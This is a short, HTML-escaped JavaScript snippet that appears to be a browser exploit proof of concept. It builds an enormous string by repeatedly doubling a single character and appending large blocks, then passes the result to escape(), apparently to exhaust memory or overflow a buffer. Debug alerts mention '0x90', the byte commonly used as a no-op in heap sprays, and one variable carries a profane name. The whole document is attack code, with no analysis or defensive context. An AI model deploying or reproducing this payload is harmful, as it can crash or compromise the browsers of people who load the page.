&lt;script&gt;
var s=String.fromCharCode(257);
var a=&quot;&quot;; var b=&quot;&quot;;
for(i=0;i&lt;1024;i++){a=a+s;}
for(i=0;i&lt;1024;i++){b=b+a;}
var ov=s;
for(i=0;i&lt;28;i++) ov += ov;
for(i=0;i&lt;88;i++) ov += b;
alert(&quot;0x90&quot;);
var Fuck=escape(ov);
alert(&quot;0x90 !&quot;);
alert(Fuck);
&lt;/script&gt;
